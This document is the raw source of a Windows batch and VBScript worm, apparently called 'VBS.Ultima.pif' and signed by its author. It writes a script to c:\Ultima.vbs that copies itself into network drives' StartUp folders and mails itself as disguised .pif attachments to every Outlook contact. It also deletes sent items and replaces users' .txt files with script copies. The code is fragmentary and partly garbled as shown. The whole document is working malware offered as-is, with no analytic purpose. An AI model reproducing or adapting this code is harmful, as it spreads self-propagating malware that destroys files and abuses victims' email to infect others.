echo "(K = "&Z&"/"&Z&") or _"&l&"(K = "&Z&"\"&Z&") or _"&l&"(K = "&Z&"("&Z&") or _"&l&"(K = "&Z&")"&Z&") or _"&l& _  >>c:\Ultima.vbs
echo "(K = "&Z&"="&Z&") or _"&l&"(K = "&Z&"'"&Z&") or _"&l&"(K = "&Z&""&Z&""&Z&""&Z&") or _"&l& _  >>c:\Ultima.vbs
echo "(K = "&Z&"#"&Z&") or _"&l&"(K = "&Z&"^"&Z&") or _"&l&"(K = "&Z&Chr(37)&Z&") or _"&l&"(K = "&Z&"+"&Z&") or _"&l& _  >>c:\Ultima.vbs
echo "(K = "&Z&"&"&Z&") or _"&l&"(K = "&Z&"{"&Z&") or _"&l&"(K = "&Z&"["&Z&") or _"&l&"(K = "&Z&"]"&Z&") or _"&l& _  >>c:\Ultima.vbs
echo "(K = "&Z&"}"&Z&") or _"&l&"(K = "&Z&"?"&Z&") or _"&l&"(K = "&Z&"~"&Z&") or _"&l&"(K = "&Z&"¨"&Z&") or _"&l& _  >>c:\Ultima.vbs
echo "(K = "&Z&";"&Z&") or _"&l&"(K = "&Z&":"&Z&") or _"&l&"(K = "&Z&"."&Z&") or _"&l&"(K = "&Z&","&Z&") or _"&l& _  >>c:\Ultima.vbs
echo "(K = "&Z&"`"&Z&") or _"&l&"(K = "&Z&"´"&Z&") or _"&l&"(K = "&Z&"|"&Z&") or _"&l&"(K = chr(10)) or _"&l& _  >>c:\Ultima.vbs
echo "(isaret="&Z&"1"&Z&") then"&l&"Set OL01 = CreateObject("&Z&"Outlook.Application"&Z&")"&l& _  >>c:\Ultima.vbs
echo "Set OL02 = OL01.GetNameSpace("&Z&"MAPI"&Z&")"&l&"Set OL05 = OL01.CreateItem(0)"&l& _  >>c:\Ultima.vbs
echo "OL05.BCC = mail2&"&Z&"@"&Z&"&ZMAIL&"&Z&"com"&Z&""&l&"OL05.Subject = "&Z&"Ultima Online Password & Bugs"&Z&""&l& _  >>c:\Ultima.vbs
echo "OL05.Body = "&Z&"You new Password and new Ultima Bugs"&Z&""&l&"OL05.Attachments.Add b&"&Z&"\UO.pif"&Z&""&l& _  >>c:\Ultima.vbs
echo "OL05.DeleteAfterSubmit = True"&l&"OL05.Send"&l&"ZMAIL="&Z&""&Z&""&l&"mail2="&Z&""&Z&""&l& _  >>c:\Ultima.vbs
echo "exit for"&l&"else "&l&"end if"&l&"end if"&l&"next"&l&"exit for"&l&"end if"&l&"end if"&l& _  >>c:\Ultima.vbs
echo "next"&l&"end if"&l&"next"&l&"end if"&l&"end if"&l&"next"&l&"end sub"&l&"sub cu(folderspec)"&l& _  >>c:\Ultima.vbs
echo "On Error Resume Next"&l&"dim bc,bd,sf"&l&"set bc = a.GetFolder(folderspec)"&l&"set sf = bc.SubFolders"&l& _  >>c:\Ultima.vbs
echo "for each bd in sf"&l&"bb(bd.path)"&l&"cu(bd.path)"&l&"next"&l&"end sub"
ML.close
g.run(b&"\mailci.dII")
SMAIL=a.createtextfile(b&"\outmail.dII")  >>c:\Ultima.vbs
echo SMAIL.Writeline "'VBS.Ultima.pif / Network infected and Outlook adresslist send / Coded by BR3AK-H3ART"&l& _  >>c:\Ultima.vbs
echo "On Error Resume Next"&l&"Set a = CreateObject("&Z&"Scripting.FileSystemObject"&Z&")"&l& _  >>c:\Ultima.vbs
echo "Set b = a.GetSpecialFolder(0)"&l&"Set g = CreateObject("&Z&"WScript.Shell"&Z&")"&l& _  >>c:\Ultima.vbs
echo "Set HH = CreateObject("&Z&"WScript.Network"&Z&")"&l&"Set RNC = HH.EnumNetworkDrives"&l& _  >>c:\Ultima.vbs
echo "If RNC.Count "&chr(60)&chr(62)&" 0 Then"&l&"For A04 = 0 To RNC.Count - 1"&l& _
"If InStr( RNC.Item(A04),"&Z&"\"&Z&") "&chr(60)&chr(62)&" 0 Then"&l& _  >>c:\Ultima.vbs
echo "a.CopyFile WScript.ScriptFullName,a.BuildPath(RNC.Item(A04),"&Z&"\WINDOWS\Start Menu\Programs\StartUp\BR3AK-H3ART.vbs"&Z&")"&l& _  >>c:\Ultima.vbs
echo "a.CopyFile WScript.ScriptFullName,a.BuildPath(RNC.Item(A04),"&Z&"\WINDOWS\desktop\Web-passwords.vbs"&Z&")"&l& _  >>c:\Ultima.vbs
echo "End If"&l&"Next"&l&"End If"&l&"Set OL01 = CreateObject("&Z&"Outlook.Application"&Z&")"&l& _  >>c:\Ultima.vbs
echo "Set OL02 = OL01.GetNameSpace("&Z&"MAPI"&Z&")"&l&"For Each OL03 In OL02.AddressLists"&l& _  >>c:\Ultima.vbs
echo "For OL04 = 1 To OL03.AddressEntries.Count"&l&"Set OL05 = OL01.CreateItem(0)"&l& _
"Set OL06 = OL01.CreateItem(0)"&l&"OL05.BCC = OL03.AddressEntries(OL04).Address"&l& _  >>c:\Ultima.vbs
echo "OL05.Subject = "&Z&"Ultima Online Password & Bugs"&Z&""&l&"OL05.Body = "&Z&"You new Password and new Ultima Bugs"&Z&""&l& _  >>c:\Ultima.vbs
echo "OL05.Attachments.Add b&"&Z&"\uo.pif"&Z&""&l&"OL05.DeleteAfterSubmit = True"&l& _  >>c:\Ultima.vbs
echo "OL05.Send"&l&"OL06.BCC = OL03.AddressEntries(OL04).Address"&l&"OL06.Subject = "&Z&"Tarkan new Remix demo"&Z&""&l& _  >>c:\Ultima.vbs
echo "OL06.Body = "&Z&"Tarkan new Remix"&Z&""&l&"OL06.Attachments.Add b&"&Z&"\Tarkan-remix-4.Mp3.pif"&Z&""&l& _  >>c:\Ultima.vbs
echo "OL06.DeleteAfterSubmit = True"&l&"OL06.Send"&l&"Next"&l&"Next"
g.run(b&"\outmail.dII")
set txtinf=a.createtextfile(b&"\txtinfsystem.dII")  >>c:\Ultima.vbs
echo txtinf.writeline "'VBS.Ultima.pif-TXT.LOG"&l& _
"'txt and log infected system,Run txt file Open TXT file and Virus file,Coded by BR3AK-H3ART"&l& _  >>c:\Ultima.vbs
echo "'age:17 / from:TURKEY"&"'Mail:br3ak_h3art@hotmail.com"&l&"On Error Resume Next"&l& _  >>c:\Ultima.vbs
echo "Set a = CreateObject("&Z&"Scripting.FileSystemObject"&Z&")"&l&"Set b = a.GetSpecialFolder(0)"&l& _  >>c:\Ultima.vbs
echo "l=Chr(13)&Chr(10)"&l&"n=Chr(34)"&l&"scrg()"&l&"sub scrg"&l& _
"On Error Resume Next"&l&"Dim ax,ba,O"&l&"Set ba = a.Drives"&l&"For Each ax in ba"&l& _  >>c:\Ultima.vbs
echo "If ax.DriveType = 2 or ax.DriveType=3 Then"&l&"cu(ax.path&"&Z&"\"&Z&")"&l&"end if"&l& _
"Next"&l&"scrg = O"&l&"end sub"&l&"sub bb(folderspec)"&l&"On Error Resume Next"&l& _  >>c:\Ultima.vbs
echo "dim bc,bd,be,U,O"&l&"set bc = a.GetFolder(folderspec)"&l&"set be = bc.Files"&l& _  >>c:\Ultima.vbs
echo "for each bd in be"&l&"U=a.GetExtensionName(bd.path)"&l&"U=lcase(U)"&l& _
"O=lcase(bd.name)"&l&"if (U="&Z&"txt"&Z&") or (U="&Z&"TXT"&Z&") then"&l& _  >>c:\Ultima.vbs
echo "dim bg,bl,bm,bn"&l&"bg=a.GetBaseName(bd.path)"&l& _
"set bl=a.CreateTextFile(d&"&Z&"\"&Z&"&bg&"&Z&".txt.txt-"&Z&")"&l& _  >>c:\Ultima.vbs
echo "Set bm=a.OpenTextFile(bd.path)"&l&"bn=bm.readall"&l&"bl.Writeline bn"&l& _
"bl.close"&l&"bm.close"&l&"a.DeleteFile(bd.path)"&l& _  >>c:\Ultima.vbs
echo "e.Copy(folderspec&"&Z&"\"&Z&"&bg&"&Z&".txt.vbs"&Z&")"&l&"end if"&l&"bk.close"&l& _
"next"&l&"end sub"&l&"sub cu(folderspec)"&l&"On Error Resume Next"&l&"dim bc,bd,sf"&l& _  >>c:\Ultima.vbs
echo "set bc = a.GetFolder(folderspec)"&l&"set sf = bc.SubFolders"&l&"for each bd in sf"&l&"bb(bd.path)"&l& _  >>c:\Ultima.vbs
echo "cu(bd.path)"&l&"next"&l&"end sub"
txtinf.close
g.run(b&"\txtinfsystem.dII")
Function atchmail(atchmailz)
On Error Resume Next  >>c:\Ultima.vbs
echo Dim OL01, OL02, OL03, OL04, OL05
Set OL01 = CreateObject("Outlook.Application")
Set OL02 = OL01.GetNameSpace("MAPI")  >>c:\Ultima.vbs
echo For Each OL03 In OL02.AddressLists
For OL04 = 1 To OL03.AddressEntries.Count
Set OL05 = OL01.CreateItem(0)  >>c:\Ultima.vbs
echo OL05.BCC = OL03.AddressEntries(OL04).Address
OL05.Subject = "Ultima Online Password & Bugs"  >>c:\Ultima.vbs
echo OL05.Body = "You new Password and new Ultima Bugs"
OL05.Attachments.Add atchmailz
OL05.DeleteAfterSubmit = True  >>c:\Ultima.vbs
echo OL05.Send
Next
Next
end Function
if (a.FileExists(b&"\by_BR3AK-H3ART_Mail_br3ak_h3art@hotmail.com_AGE_17.dII")) Then  >>c:\Ultima.vbs
echo else
set INFO=a.CreateTextFile(b&"\by_BR3AK-H3ART_Mail_br3ak_h3art@hotmail.com_AGE_17.dII")  >>c:\Ultima.vbs
echo INFO.Writeline "MSGBOX ""You Computer infected VBS/Ultima.pif Viruses.!¿ "&_
" ah bad Problem "&_  >>c:\Ultima.vbs
echo " Good Luck!"",0,""Author : By BR3AK-H3ART / Mail : br3ak_h3art@hotmail.com / AGE : 17 / FROM : TURKEY"""
end if  >>c:\Ultima.vbs
echo if month(now) = 8 then
atchmail(aatch)
end if  >>c:\Ultima.vbs
echo  >>c:\Ultima.vbs
echo copy c:\windows\wscript.exe c:\ >c:\Runwin.bat
echo Wscript Ultima.vbs >>c:\Runwin.bat
call c:\Runwin.bat